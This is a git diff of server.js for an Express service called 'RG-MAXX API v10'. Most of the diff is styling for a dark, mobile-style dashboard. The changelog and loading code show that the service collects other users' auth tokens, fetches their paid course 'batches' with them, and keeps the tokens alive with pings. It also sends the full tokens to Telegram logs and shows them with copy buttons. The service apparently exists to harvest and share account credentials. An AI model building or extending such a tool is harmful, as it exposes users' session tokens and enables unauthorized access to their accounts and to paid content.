@@ -1,10 +1,12 @@
-// server.js — RG-MAXX API v5
-// ✅ 24/7 Token KeepAlive — har 25 min silent ping
-// ✅ ID+Password login
-// ✅ Batches as cards with thumbnails (live fetch from API)
-// ✅ Premium dark UI — God-level design
-// ✅ No duplicate batches
-// ✅ Telegram: userId + token logs, /disconnect support
+// server.js — RG-MAXX API v10
+// ✅ FULL token in Telegram logs
+// ✅ Auto batch add from users.js
+// ✅ God-level Android app UI
+// ✅ Telegram Tokens section — full stats
+// ✅ Today login count
+// ✅ API live data preview
+// ✅ Token copy buttons
+// ✅ Vercel deploy ready
 
 import "dotenv/config";
 import express from "express";
@@ -14,24 +16,21 @@ import {
   addToken, removeToken, getAllTokens,
   getTokenCount, getToken, getAnyToken,
   getTokenForBatch, clearPool, updateBatches,
+  getTelegramTokens, getManualTokens,
 } from "./lib/tokenStore.js";
 import { smartFetch } from "./lib/smartFetch.js";
 import { fetchUserBatches, loginWithCredentials } from "./lib/fetchBatches.js";
 import {
   sendLog, buildLoginLog,
   processTelegramUpdate, setWebhook,
+  getTodayLoginCount, getLogHistory,
 } from "./lib/telegram.js";
 import { startKeepAlive, getTokenHealth } from "./lib/tokenKeepAlive.js";
 import { MANUAL_USERS } from "./users.js";
 
 const app = express();
-
-// ── INIT STATE (Vercel-safe lazy init) ──────────────────────────────────────
-let _initialized = false;
-let _initPromise = null;
 app.use(express.json());
 
-// ── CORS ─────────────────────────────────────────────────────────────────────
 app.use((req, res, next) => {
   res.setHeader("Access-Control-Allow-Origin", "*");
   res.setHeader("Access-Control-Allow-Methods", "GET, POST, OPTIONS");
@@ -40,27 +39,19 @@ app.use((req, res, next) => {
   next();
 });
 
-// ── LAZY INIT MIDDLEWARE (Vercel-safe) ───────────────────────────────────────
-// Har request se pehle users.js load hota hai (agar nahi hua toh)
-app.use(async (req, res, next) => {
-  try { await ensureInitialized(); } catch (e) { console.error("Init error:", e.message); }
-  next();
-});
-
 // ══════════════════════════════════════════════════════════════════════════════
-// BOOT
+// BOOT — Auto load users.js + auto fetch batches
 // ══════════════════════════════════════════════════════════════════════════════
 async function loadManualUsers() {
   const valid = MANUAL_USERS.filter(
-    (u) =>
-      u.userId &&
-      u.token &&
+    (u) => u.userId && u.token &&
       !(u.token.startsWith("TOKEN_") && u.token.endsWith("_YAHAN_PASTE_KARO"))
   );
-  console.log(`\n📋 Loading ${valid.length} users from users.js (PARALLEL)...`);
+  console.log(`\n📋 Loading ${valid.length} users from users.js (PARALLEL AUTO-BATCH)...`);
 
   const results = await Promise.allSettled(
     valid.map(async (u) => {
+      // ✅ Auto fetch batches — users.js ke tokens ke batches automatically add
       const batches = await fetchUserBatches(u.userId, u.token);
       addToken(u.userId, u.token, u.name || "", batches, "manual");
       console.log(`  ✅ ${u.name || u.userId} — ${batches.length} batches`);
@@ -71,499 +62,608 @@ async function loadManualUsers() {
   const loaded = results.filter((r) => r.status === "fulfilled").length;
   const failed = results.filter((r) => r.status === "rejected");
   failed.forEach((r, i) => console.log(`  ❌ ${valid[i]?.userId} — ${r.reason?.message || r.reason}`));
-  console.log(`✅ ${loaded}/${valid.length} loaded\n`);
+  console.log(`✅ ${loaded}/${valid.length} loaded with auto-batches\n`);
 }
 
 // ══════════════════════════════════════════════════════════════════════════════
-// HOME — GOD-LEVEL DARK UI
+// HOME — V10 GOD-LEVEL ANDROID APP UI
 // ══════════════════════════════════════════════════════════════════════════════
 app.get("/", (req, res) => {
   res.send(`<!DOCTYPE html>
 <html lang="en">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width,initial-scale=1">
-<title>RG-MAXX API v8</title>
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
+<title>RG-MAXX API v10</title>
+<link href="https://fonts.googleapis.com/css2?family=Syne:wght@400;600;700;800&family=DM+Sans:wght@300;400;500;600;700&display=swap" rel="stylesheet">
 <style>
 :root{
-  --bg:#06090f;
-  --bg2:#0a0f1a;
-  --surface:#0d1424;
-  --border:#1a2540;
-  --border2:#243050;
-  --accent:#7c6fff;
-  --accent2:#00d4ff;
-  --accent3:#ff6b9d;
+  --bg:#060b14;
+  --bg2:#0a1120;
+  --surface:#0d1628;
+  --card:#0f1c30;
+  --card2:#111f33;
+  --border:#1b2d45;
+  --border2:#243a55;
+  --accent:#4f8ef7;
+  --accent2:#00e5ff;
+  --accent3:#a78bfa;
   --green:#00e676;
-  --red:#ff5252;
-  --yellow:#ffd740;
-  --text:#e8edf5;
-  --muted:#5a6a8a;
-  --card:#0f1826;
-  --card2:#111e30;
-  --glow:rgba(124,111,255,0.15);
+  --red:#ff4f5e;
+  --yellow:#ffc400;
+  --orange:#ff7043;
+  --pink:#f472b6;
+  --text:#e2eaf5;
+  --text2:#8ba0bc;
+  --muted:#4a6080;
+  --glow:rgba(79,142,247,0.15);
+  --card-shadow:0 4px 24px rgba(0,0,0,0.4);
 }
-*{box-sizing:border-box;margin:0;padding:0}
-html{scroll-behavior:smooth}
+*{box-sizing:border-box;margin:0;padding:0;-webkit-tap-highlight-color:transparent}
+html{scroll-behavior:smooth;height:100%}
 body{
-  font-family:'Segoe UI',system-ui,sans-serif;
+  font-family:'DM Sans',sans-serif;
   background:var(--bg);
   color:var(--text);
   min-height:100vh;
   overflow-x:hidden;
 }
-
-/* ── SCROLLBAR ── */
-::-webkit-scrollbar{width:5px;height:5px}
-::-webkit-scrollbar-track{background:var(--bg)}
+/* SCROLLBAR */
+::-webkit-scrollbar{width:3px;height:3px}
+::-webkit-scrollbar-track{background:transparent}
 ::-webkit-scrollbar-thumb{background:var(--border2);border-radius:10px}
 
-/* ── NAV ── */
+/* ── STATUS BAR SPACER ── */
+.statusbar{height:env(safe-area-inset-top,0px);background:var(--bg2)}
+
+/* ── TOP NAV ── */
 .nav{
-  background:rgba(10,15,26,0.92);
+  background:rgba(10,17,32,0.95);
   backdrop-filter:blur(20px);
+  -webkit-backdrop-filter:blur(20px);
   border-bottom:1px solid var(--border);
-  padding:0 32px;
-  height:60px;
-  display:flex;
-  align-items:center;
-  justify-content:space-between;
-  position:sticky;top:0;z-index:200;
+  padding:0 16px;
+  height:56px;
+  display:flex;align-items:center;justify-content:space-between;
+  position:sticky;top:0;z-index:300;
 }
-.brand{display:flex;align-items:center;gap:12px}
-.brand-icon{
-  width:34px;height:34px;
+.nav-brand{display:flex;align-items:center;gap:10px}
+.nav-logo{
+  width:36px;height:36px;
   background:linear-gradient(135deg,var(--accent),var(--accent2));
   border-radius:10px;
   display:flex;align-items:center;justify-content:center;
-  font-size:1rem;font-weight:900;color:#fff;
-  box-shadow:0 0 16px rgba(124,111,255,0.4);
+  font-family:'Syne',sans-serif;
+  font-size:1rem;font-weight:800;color:#fff;
+  box-shadow:0 0 20px rgba(79,142,247,0.5);
+  flex-shrink:0;
 }
-.brand-name{font-size:1.1rem;font-weight:800;color:var(--text)}
-.brand-name span{
-  background:linear-gradient(90deg,var(--accent),var(--accent2));
+.nav-title{
+  font-family:'Syne',sans-serif;
+  font-size:1rem;font-weight:800;
+  background:linear-gradient(90deg,#fff,var(--accent2));
   -webkit-background-clip:text;-webkit-text-fill-color:transparent;
+  letter-spacing:-.3px;
 }
-.v-badge{
-  background:linear-gradient(135deg,var(--accent),var(--accent2));
-  color:#fff;font-size:.6rem;padding:2px 7px;
-  border-radius:20px;font-weight:800;letter-spacing:.5px;
-  margin-left:4px;
+.nav-badge{
+  background:linear-gradient(135deg,var(--accent),var(--accent3));
+  color:#fff;font-size:.55rem;padding:2px 6px;
+  border-radius:6px;font-weight:800;letter-spacing:.5px;
+  margin-left:4px;vertical-align:middle;
 }
-.nav-right{display:flex;align-items:center;gap:12px}
-.pill{
-  display:flex;align-items:center;gap:6px;
-  background:var(--surface);border:1px solid var(--border);
-  padding:5px 12px;border-radius:20px;font-size:.75rem;color:var(--muted);
+.nav-right{display:flex;align-items:center;gap:8px}
+.live-pill{
+  display:flex;align-items:center;gap:5px;
+  background:rgba(0,230,118,.08);border:1px solid rgba(0,230,118,.2);
+  padding:4px 10px;border-radius:20px;font-size:.68rem;
+  color:var(--green);font-weight:700;letter-spacing:.3px;
 }
-.dot{
-  width:7px;height:7px;border-radius:50%;
+.pulse-dot{
+  width:6px;height:6px;border-radius:50%;
   background:var(--green);
   box-shadow:0 0 6px var(--green);
-  animation:blink 2s infinite;
+  animation:pulse 2s ease-in-out infinite;
 }
-@keyframes blink{0%,100%{opacity:1}50%{opacity:.3}}
+@keyframes pulse{0%,100%{opacity:1;transform:scale(1)}50%{opacity:.4;transform:scale(.8)}}
+.token-pill{
+  display:flex;align-items:center;gap:4px;
+  background:var(--surface);border:1px solid var(--border);
+  padding:4px 10px;border-radius:20px;
+  font-size:.72rem;color:var(--text2);font-weight:600;
+}
+.tp-num{color:var(--accent);font-weight:800}
 
-/* ── HERO ── */
+/* ── HERO STRIP ── */
 .hero{
-  padding:70px 32px 50px;
-  text-align:center;
-  position:relative;
-  overflow:hidden;
+  padding:24px 16px 20px;
+  background:linear-gradient(180deg,var(--bg2) 0%,var(--bg) 100%);
+  border-bottom:1px solid var(--border);
+  position:relative;overflow:hidden;
 }
 .hero::before{
   content:'';position:absolute;
-  top:-100px;left:50%;transform:translateX(-50%);
-  width:700px;height:400px;
-  background:radial-gradient(ellipse,rgba(124,111,255,.1) 0,transparent 70%);
+  top:-60px;right:-40px;
+  width:200px;height:200px;
+  background:radial-gradient(circle,rgba(79,142,247,.12),transparent 70%);
   pointer-events:none;
 }
 .hero-tag{
-  display:inline-flex;align-items:center;gap:6px;
-  background:rgba(124,111,255,.1);border:1px solid rgba(124,111,255,.3);
-  padding:4px 14px;border-radius:20px;
-  font-size:.7rem;font-weight:700;color:var(--accent);
-  letter-spacing:1px;text-transform:uppercase;
-  margin-bottom:20px;
+  display:inline-flex;align-items:center;gap:5px;
+  background:rgba(79,142,247,.1);border:1px solid rgba(79,142,247,.25);
+  padding:3px 10px;border-radius:20px;
+  font-size:.62rem;font-weight:700;color:var(--accent);
+  letter-spacing:1.5px;text-transform:uppercase;
+  margin-bottom:10px;
 }
-.hero h1{
-  font-size:3rem;font-weight:900;line-height:1.1;
-  background:linear-gradient(135deg,#fff 20%,var(--accent2) 60%,var(--accent));
+.hero-title{
+  font-family:'Syne',sans-serif;
+  font-size:1.7rem;font-weight:800;line-height:1.1;
+  background:linear-gradient(135deg,#fff 30%,var(--accent2));
   -webkit-background-clip:text;-webkit-text-fill-color:transparent;
-  margin-bottom:12px;
+  margin-bottom:6px;
 }
-.hero p{color:var(--muted);font-size:.95rem;max-width:480px;margin:0 auto 36px;line-height:1.7}
+.hero-sub{font-size:.78rem;color:var(--text2);line-height:1.6}
 
-/* ── STATS ── */
-.stats{
-  display:grid;
-  grid-template-columns:repeat(auto-fit,minmax(150px,1fr));
-  gap:14px;
-  max-width:900px;margin:0 auto;
-  padding:0 32px 50px;
+/* ── STATS ROW ── */
+.stats-scroll{
+  display:flex;gap:10px;
+  padding:14px 16px;
+  overflow-x:auto;
+  border-bottom:1px solid var(--border);
+  scrollbar-width:none;
 }
-.stat{
-  background:var(--card);
-  border:1px solid var(--border);
-  border-radius:14px;
-  padding:18px 16px;
-  text-align:center;
-  position:relative;overflow:hidden;
-  transition:border-color .2s,transform .2s;
+.stats-scroll::-webkit-scrollbar{display:none}
+.stat-chip{
+  flex-shrink:0;
+  background:var(--card);border:1px solid var(--border);
+  border-radius:14px;padding:12px 16px;
+  min-width:100px;text-align:center;
+  transition:all .2s;
 }
-.stat:hover{border-color:var(--accent);transform:translateY(-2px)}
-.stat::after{
-  content:'';position:absolute;
-  top:0;left:0;right:0;height:2px;
-  background:linear-gradient(90deg,var(--accent),var(--accent2));
-  opacity:0;transition:opacity .2s;
-}
-.stat:hover::after{opacity:1}
-.stat-val{
-  font-size:2rem;font-weight:900;
+.stat-chip:hover{border-color:var(--accent);transform:translateY(-1px)}
+.stat-num{
+  font-family:'Syne',sans-serif;
+  font-size:1.6rem;font-weight:800;line-height:1;
   background:linear-gradient(135deg,var(--accent),var(--accent2));
   -webkit-background-clip:text;-webkit-text-fill-color:transparent;
-  line-height:1;margin-bottom:6px;
+  margin-bottom:4px;
 }
-.stat-lbl{font-size:.7rem;color:var(--muted);text-transform:uppercase;letter-spacing:.8px}
+.stat-lbl{font-size:.6rem;color:var(--muted);text-transform:uppercase;letter-spacing:.8px;font-weight:600}
 
-/* ── MAIN ── */
-.main{max-width:1200px;margin:0 auto;padding:0 32px 80px}
-
-/* ── TABS ── */
-.tabs{
-  display:flex;gap:4px;
-  background:var(--surface);border:1px solid var(--border);
-  border-radius:12px;padding:5px;
-  margin-bottom:30px;overflow-x:auto;
+/* ── BOTTOM NAV ── */
+.bottom-nav{
+  position:fixed;bottom:0;left:0;right:0;
+  background:rgba(10,17,32,0.97);
+  backdrop-filter:blur(20px);
+  -webkit-backdrop-filter:blur(20px);
+  border-top:1px solid var(--border);
+  display:flex;
+  padding:8px 0 max(8px,env(safe-area-inset-bottom));
+  z-index:300;
 }
-.tab{
-  flex:1;min-width:fit-content;
-  padding:8px 18px;border-radius:8px;
-  font-size:.82rem;font-weight:600;color:var(--muted);
+.bn-item{
+  flex:1;display:flex;flex-direction:column;
+  align-items:center;justify-content:center;
+  gap:3px;padding:4px 0;
   cursor:pointer;border:none;background:transparent;
-  transition:all .2s;white-space:nowrap;
+  transition:all .2s;
 }
-.tab.active{
-  background:linear-gradient(135deg,var(--accent),var(--accent2));
-  color:#fff;box-shadow:0 4px 14px rgba(124,111,255,.3);
+.bn-icon{font-size:1.2rem;line-height:1}
+.bn-label{font-size:.58rem;font-weight:600;color:var(--muted);letter-spacing:.3px;text-transform:uppercase;transition:color .2s}
+.bn-item.active .bn-label{color:var(--accent)}
+.bn-item.active .bn-icon{filter:drop-shadow(0 0 6px var(--accent))}
+.bn-indicator{
+  width:4px;height:4px;border-radius:50%;
+  background:var(--accent);
+  box-shadow:0 0 6px var(--accent);
+  opacity:0;transition:opacity .2s;margin-top:1px;
 }
-.tab:hover:not(.active){color:var(--text);background:var(--border)}
+.bn-item.active .bn-indicator{opacity:1}
 
-/* ── TAB PANELS ── */
+/* ── MAIN CONTENT ── */
+.main{
+  padding:0 0 80px;
+  max-width:600px;margin:0 auto;
+}
+
+/* ── PANELS ── */
 .panel{display:none}
 .panel.active{display:block}
 
-/* ── SECTION TITLE ── */
-.section-title{
-  font-size:.65rem;font-weight:800;letter-spacing:2.5px;
-  text-transform:uppercase;color:var(--accent);
-  margin:30px 0 14px;
-  display:flex;align-items:center;gap:10px;
+/* ── SECTION HEADER ── */
+.sec-header{
+  display:flex;align-items:center;justify-content:space-between;
+  padding:16px 16px 10px;
 }
-.section-title::after{content:'';flex:1;height:1px;background:var(--border)}
+.sec-title{
+  font-family:'Syne',sans-serif;
+  font-size:.78rem;font-weight:800;
+  letter-spacing:2px;text-transform:uppercase;
+  color:var(--accent2);
+  display:flex;align-items:center;gap:6px;
+}
+.sec-title::before{
+  content:'';width:3px;height:14px;
+  background:linear-gradient(var(--accent),var(--accent2));
+  border-radius:2px;
+}
+.refresh-btn{
+  background:var(--surface);border:1px solid var(--border);
+  color:var(--text2);padding:5px 12px;border-radius:8px;
+  cursor:pointer;font-size:.72rem;font-weight:600;
+  display:flex;align-items:center;gap:5px;
+  transition:all .2s;
+}
+.refresh-btn:hover{border-color:var(--accent);color:var(--accent)}
 
-/* ── BATCH GRID ── */
-.batch-grid{
-  display:grid;
-  grid-template-columns:repeat(auto-fill,minmax(220px,1fr));
-  gap:16px;
-  margin-bottom:30px;
-}
+/* ── BATCH CARDS ── */
+.batch-list{padding:0 16px;display:flex;flex-direction:column;gap:10px}
 .batch-card{
-  background:var(--card);
-  border:1px solid var(--border);
-  border-radius:14px;
-  overflow:hidden;
-  transition:all .25s;
-  cursor:default;
+  background:var(--card);border:1px solid var(--border);
+  border-radius:14px;overflow:hidden;
+  display:flex;align-items:center;gap:12px;
+  padding:10px;transition:all .25s;
 }
-.batch-card:hover{
-  border-color:var(--accent);
-  transform:translateY(-3px);
-  box-shadow:0 8px 30px rgba(124,111,255,.15);
-}
+.batch-card:hover{border-color:var(--accent);box-shadow:0 4px 20px rgba(79,142,247,.1)}
 .batch-thumb{
-  width:100%;height:130px;
-  object-fit:cover;
+  width:60px;height:60px;border-radius:10px;
+  object-fit:cover;flex-shrink:0;
   background:linear-gradient(135deg,var(--surface),var(--border));
-  display:block;
 }
-.batch-thumb-placeholder{
-  width:100%;height:130px;
-  background:linear-gradient(135deg,#1a2540,#0d1424);
+.batch-thumb-ph{
+  width:60px;height:60px;border-radius:10px;
+  background:linear-gradient(135deg,#1a2d45,#0d1628);
   display:flex;align-items:center;justify-content:center;
-  font-size:2.5rem;
+  font-size:1.4rem;flex-shrink:0;
 }
-.batch-info{padding:12px 14px 14px}
-.batch-id{
-  font-size:.65rem;font-weight:700;
-  color:var(--accent2);letter-spacing:.5px;
-  text-transform:uppercase;margin-bottom:5px;
-}
+.batch-info{flex:1;min-width:0}
+.batch-id{font-size:.6rem;font-weight:700;color:var(--accent2);letter-spacing:.5px;text-transform:uppercase;margin-bottom:3px}
 .batch-name{
-  font-size:.85rem;font-weight:600;
-  color:var(--text);line-height:1.35;
-  display:-webkit-box;-webkit-line-clamp:2;
-  -webkit-box-orient:vertical;overflow:hidden;
-  margin-bottom:8px;
+  font-size:.82rem;font-weight:600;color:var(--text);
+  line-height:1.3;
+  display:-webkit-box;-webkit-line-clamp:2;-webkit-box-orient:vertical;overflow:hidden;
+  margin-bottom:4px;
 }
-.batch-expiry{
-  font-size:.7rem;color:var(--muted);
-  display:flex;align-items:center;gap:4px;
-}
-.batch-expiry .exp-dot{
-  width:5px;height:5px;border-radius:50%;
-  background:var(--green);flex-shrink:0;
-}
+.batch-exp{font-size:.66rem;color:var(--muted);display:flex;align-items:center;gap:3px}
+.exp-dot{width:5px;height:5px;border-radius:50%;background:var(--green);flex-shrink:0}
 
-/* ── USER CARDS ── */
-.user-grid{
-  display:grid;
-  grid-template-columns:repeat(auto-fill,minmax(280px,1fr));
-  gap:14px;
-  margin-bottom:20px;
-}
+/* ── USER / TOKEN CARDS ── */
+.user-list{padding:0 16px;display:flex;flex-direction:column;gap:10px}
 .user-card{
   background:var(--card);border:1px solid var(--border);
-  border-radius:14px;padding:16px 18px;
-  transition:all .2s;
+  border-radius:14px;padding:14px;transition:all .2s;
 }
-.user-card:hover{border-color:var(--accent);transform:translateY(-2px)}
-.user-top{display:flex;align-items:center;gap:12px;margin-bottom:12px}
+.user-card:hover{border-color:var(--accent);box-shadow:0 4px 20px rgba(79,142,247,.1)}
+.user-top{display:flex;align-items:center;gap:10px;margin-bottom:10px}
 .user-avatar{
-  width:40px;height:40px;border-radius:12px;
-  background:linear-gradient(135deg,var(--accent),var(--accent2));
+  width:40px;height:40px;border-radius:11px;
+  background:linear-gradient(135deg,var(--accent),var(--accent3));
   display:flex;align-items:center;justify-content:center;
-  font-size:1.1rem;font-weight:800;color:#fff;flex-shrink:0;
-  box-shadow:0 4px 12px rgba(124,111,255,.3);
+  font-family:'Syne',sans-serif;
+  font-size:1rem;font-weight:800;color:#fff;flex-shrink:0;
+  box-shadow:0 4px 12px rgba(79,142,247,.3);
 }
-.user-name{font-size:.9rem;font-weight:700;color:var(--text);margin-bottom:3px}
-.user-id{font-size:.72rem;color:var(--muted);font-family:monospace}
-.source-tag{
-  display:inline-block;
-  padding:2px 8px;border-radius:6px;font-size:.65rem;font-weight:700;
-  letter-spacing:.5px;text-transform:uppercase;margin-left:auto;flex-shrink:0;
+.user-name{font-size:.88rem;font-weight:700;color:var(--text);margin-bottom:2px}
+.user-id{font-size:.68rem;color:var(--muted);font-family:'Courier New',monospace}
+.src-badge{
+  margin-left:auto;flex-shrink:0;
+  padding:2px 8px;border-radius:6px;
+  font-size:.6rem;font-weight:800;letter-spacing:.5px;text-transform:uppercase;
 }
-.src-manual{background:rgba(0,230,118,.1);color:var(--green);border:1px solid rgba(0,230,118,.2)}
-.src-telegram{background:rgba(0,212,255,.1);color:var(--accent2);border:1px solid rgba(0,212,255,.2)}
-.src-login{background:rgba(124,111,255,.1);color:var(--accent);border:1px solid rgba(124,111,255,.2)}
-.src-api{background:rgba(255,107,157,.1);color:var(--accent3);border:1px solid rgba(255,107,157,.2)}
-.src-bulk{background:rgba(255,215,64,.1);color:var(--yellow);border:1px solid rgba(255,215,64,.2)}
-.user-stat{font-size:.72rem;color:var(--muted)}
-.user-stat strong{color:var(--accent2)}
-.health-bar{
-  height:3px;border-radius:3px;margin-top:10px;
-  background:var(--border);overflow:hidden;
+.src-manual{background:rgba(0,230,118,.08);color:var(--green);border:1px solid rgba(0,230,118,.2)}
+.src-telegram{background:rgba(0,229,255,.08);color:var(--accent2);border:1px solid rgba(0,229,255,.2)}
+.src-login{background:rgba(79,142,247,.08);color:var(--accent);border:1px solid rgba(79,142,247,.2)}
+.src-api{background:rgba(167,139,250,.08);color:var(--accent3);border:1px solid rgba(167,139,250,.2)}
+.src-bulk{background:rgba(255,196,0,.08);color:var(--yellow);border:1px solid rgba(255,196,0,.2)}
+
+.token-row{
+  background:var(--surface);border:1px solid var(--border);
+  border-radius:8px;padding:8px 10px;
+  display:flex;align-items:center;justify-content:space-between;
+  gap:8px;margin-bottom:8px;
 }
-.health-bar-fill{height:100%;border-radius:3px;background:var(--green);transition:width .5s}
+.token-text{
+  font-family:'Courier New',monospace;
+  font-size:.65rem;color:var(--text2);
+  word-break:break-all;flex:1;line-height:1.4;
+}
+.copy-btn{
+  background:linear-gradient(135deg,var(--accent),var(--accent2));
+  color:#fff;border:none;padding:4px 10px;
+  border-radius:6px;cursor:pointer;font-size:.65rem;
+  font-weight:700;flex-shrink:0;transition:all .2s;
+  font-family:'DM Sans',sans-serif;
+}
+.copy-btn:hover{opacity:.85;transform:scale(.97)}
+.copy-btn.copied{background:linear-gradient(135deg,var(--green),#00bfa5);color:#000}
+
+.user-meta{display:flex;flex-wrap:wrap;gap:8px}
+.meta-pill{
+  display:flex;align-items:center;gap:4px;
+  background:var(--surface);border:1px solid var(--border);
+  padding:3px 8px;border-radius:6px;font-size:.68rem;color:var(--text2);
+}
+.meta-pill strong{color:var(--accent2)}
+
+.health-bar{height:3px;border-radius:3px;background:var(--border);overflow:hidden;margin-top:10px}
+.health-fill{height:100%;border-radius:3px;background:var(--green);transition:width .5s}
+
+/* ── TELEGRAM TOKENS SECTION ── */
+.tg-overview{
+  margin:0 16px 12px;
+  background:linear-gradient(135deg,rgba(0,229,255,.06),rgba(79,142,247,.04));
+  border:1px solid rgba(0,229,255,.2);
+  border-radius:14px;padding:14px 16px;
+}
+.tg-title{
+  font-family:'Syne',sans-serif;
+  font-size:.72rem;font-weight:800;color:var(--accent2);
+  letter-spacing:1.5px;text-transform:uppercase;
+  margin-bottom:10px;display:flex;align-items:center;gap:6px;
+}
+.tg-stats{display:flex;flex-wrap:wrap;gap:8px}
+.tg-stat-item{
+  background:var(--surface);border:1px solid var(--border);
+  border-radius:8px;padding:8px 12px;flex:1;min-width:80px;text-align:center;
+}
+.tg-stat-num{font-family:'Syne',sans-serif;font-size:1.2rem;font-weight:800;color:var(--accent2)}
+.tg-stat-lbl{font-size:.58rem;color:var(--muted);text-transform:uppercase;letter-spacing:.5px;margin-top:1px}
+
+/* ── LOG FEED ── */
+.log-feed{padding:0 16px;display:flex;flex-direction:column;gap:8px}
+.log-entry{
+  background:var(--card);border:1px solid var(--border);
+  border-radius:10px;padding:10px 12px;
+  border-left:3px solid var(--accent);
+}
+.log-entry.source-telegram{border-left-color:var(--accent2)}
+.log-entry.source-manual{border-left-color:var(--green)}
+.log-entry.source-id_pass{border-left-color:var(--accent3)}
+.log-top{display:flex;align-items:center;gap:6px;margin-bottom:5px}
+.log-uid{font-size:.72rem;font-weight:700;color:var(--text);font-family:'Courier New',monospace}
+.log-src{font-size:.58rem;padding:1px 6px;border-radius:4px;font-weight:700}
+.log-time{margin-left:auto;font-size:.6rem;color:var(--muted)}
+.log-token{font-size:.62rem;color:var(--text2);font-family:'Courier New',monospace;word-break:break-all;margin-bottom:4px}
+.log-batches{font-size:.66rem;color:var(--muted)}
 
 /* ── API CARDS ── */
+.api-list{padding:0 16px;display:flex;flex-direction:column;gap:8px}
 .api-card{
   background:var(--card);border:1px solid var(--border);
-  border-radius:12px;padding:14px 18px;margin-bottom:10px;
-  transition:all .2s;
+  border-radius:12px;padding:12px 14px;transition:all .2s;
 }
-.api-card:hover{border-color:var(--accent);transform:translateX(3px)}
-.api-top{display:flex;align-items:center;gap:10px;flex-wrap:wrap}
+.api-card:hover{border-color:var(--accent);transform:translateX(2px)}
+.api-top{display:flex;align-items:center;gap:8px;flex-wrap:wrap;margin-bottom:6px}
 .method{
-  display:inline-block;padding:3px 10px;border-radius:6px;
-  font-size:.65rem;font-weight:900;letter-spacing:.8px;flex-shrink:0;
+  padding:2px 8px;border-radius:5px;
+  font-size:.62rem;font-weight:900;letter-spacing:.8px;flex-shrink:0;
 }
-.GET{background:rgba(0,212,255,.1);color:var(--accent2);border:1px solid rgba(0,212,255,.25)}
-.POST{background:rgba(0,230,118,.1);color:var(--green);border:1px solid rgba(0,230,118,.25)}
+.GET{background:rgba(0,229,255,.08);color:var(--accent2);border:1px solid rgba(0,229,255,.2)}
+.POST{background:rgba(0,230,118,.08);color:var(--green);border:1px solid rgba(0,230,118,.2)}
 .endpoint{
-  font-family:monospace;font-size:.82rem;
-  color:#a78bfa;word-break:break-all;
+  font-family:'Courier New',monospace;font-size:.75rem;
+  color:#a78bfa;word-break:break-all;flex:1;
 }
-.api-desc{color:var(--muted);font-size:.8rem;margin-top:6px;line-height:1.5}
-.api-params{font-size:.75rem;color:var(--yellow);margin-top:4px}
-.new-badge{
+.api-desc{color:var(--text2);font-size:.75rem;line-height:1.5;margin-bottom:4px}
+.api-params{font-size:.68rem;color:var(--yellow);margin-top:2px}
+.try-btn{
+  background:var(--surface);border:1px solid var(--border);
+  color:var(--accent);padding:3px 10px;border-radius:6px;
+  cursor:pointer;font-size:.65rem;font-weight:700;
+  transition:all .2s;margin-top:4px;
+}
+.try-btn:hover{border-color:var(--accent);background:rgba(79,142,247,.08)}
+.new-tag{
   background:linear-gradient(135deg,var(--accent),var(--accent2));
-  color:#fff;font-size:.6rem;padding:2px 7px;
-  border-radius:10px;font-weight:800;margin-left:auto;flex-shrink:0;
+  color:#fff;font-size:.55rem;padding:1px 6px;border-radius:5px;
+  font-weight:800;margin-left:auto;flex-shrink:0;
 }
+.api-response{
+  background:var(--bg);border:1px solid var(--border);
+  border-radius:8px;padding:10px 12px;margin-top:8px;
+  font-size:.68rem;font-family:'Courier New',monospace;
+  color:#94a3b8;line-height:1.6;overflow-x:auto;
+  max-height:200px;overflow-y:auto;
+  display:none;
+}
+.api-response.visible{display:block}
 
 /* ── INFO BOX ── */
 .info-box{
-  background:linear-gradient(135deg,rgba(124,111,255,.07),rgba(0,212,255,.05));
-  border:1px solid rgba(124,111,255,.2);
-  border-radius:14px;padding:18px 22px;margin-bottom:20px;
+  margin:0 16px 12px;
+  background:linear-gradient(135deg,rgba(79,142,247,.06),rgba(167,139,250,.04));
+  border:1px solid rgba(79,142,247,.2);border-radius:14px;padding:14px 16px;
 }
-.info-box h3{color:var(--accent2);font-size:.85rem;margin-bottom:10px}
+.info-title{color:var(--accent2);font-size:.78rem;font-weight:700;margin-bottom:8px;font-family:'Syne',sans-serif}
 pre{
-  background:var(--bg);border:1px solid var(--border);
-  border-radius:8px;padding:12px 16px;
-  font-size:.75rem;overflow-x:auto;
-  color:#94a3b8;font-family:'Consolas',monospace;
-  margin-top:10px;line-height:1.6;
+  background:var(--bg);border:1px solid var(--border);border-radius:8px;
+  padding:10px 12px;font-size:.68rem;overflow-x:auto;
+  color:#94a3b8;font-family:'Courier New',monospace;margin-top:8px;line-height:1.6;
 }
 code{
-  background:rgba(124,111,255,.12);color:#c4b5fd;
-  padding:2px 7px;border-radius:5px;
-  font-size:.8rem;font-family:'Consolas',monospace;
+  background:rgba(79,142,247,.1);color:#a78bfa;
+  padding:1px 5px;border-radius:4px;font-size:.75rem;
+  font-family:'Courier New',monospace;
 }
 
-/* ── LOADING ── */
+/* ── LOADING / EMPTY ── */
 .loader{
   display:flex;align-items:center;justify-content:center;
-  padding:40px;color:var(--muted);font-size:.85rem;gap:10px;
+  padding:40px 20px;color:var(--muted);font-size:.8rem;gap:8px;
 }
 .spin{
-  width:18px;height:18px;border-radius:50%;
-  border:2px solid var(--border);
-  border-top-color:var(--accent);
-  animation:spin .8s linear infinite;
+  width:16px;height:16px;border-radius:50%;
+  border:2px solid var(--border);border-top-color:var(--accent);
+  animation:spin .7s linear infinite;
 }
 @keyframes spin{to{transform:rotate(360deg)}}
+.empty{text-align:center;padding:50px 20px;color:var(--muted)}
+.empty-icon{font-size:2.5rem;margin-bottom:10px;opacity:.4}
 
-/* ── EMPTY ── */
-.empty{
-  text-align:center;padding:60px 20px;color:var(--muted);
+/* ── HEALTH CARDS ── */
+.health-grid{padding:0 16px;display:flex;flex-direction:column;gap:10px}
+.health-card{
+  background:var(--card);border:1px solid var(--border);
+  border-radius:14px;padding:12px 14px;
 }
-.empty-icon{font-size:3rem;margin-bottom:12px;opacity:.5}
-
-/* ── FOOTER ── */
-footer{
-  text-align:center;padding:30px;color:var(--muted);
-  font-size:.75rem;border-top:1px solid var(--border);
+.health-top{display:flex;align-items:center;gap:10px;margin-bottom:8px}
+.health-status-icon{
+  width:36px;height:36px;border-radius:10px;
+  display:flex;align-items:center;justify-content:center;
+  font-size:1rem;flex-shrink:0;
 }
+.health-meta{font-size:.68rem;color:var(--muted);display:flex;gap:10px;flex-wrap:wrap}
 
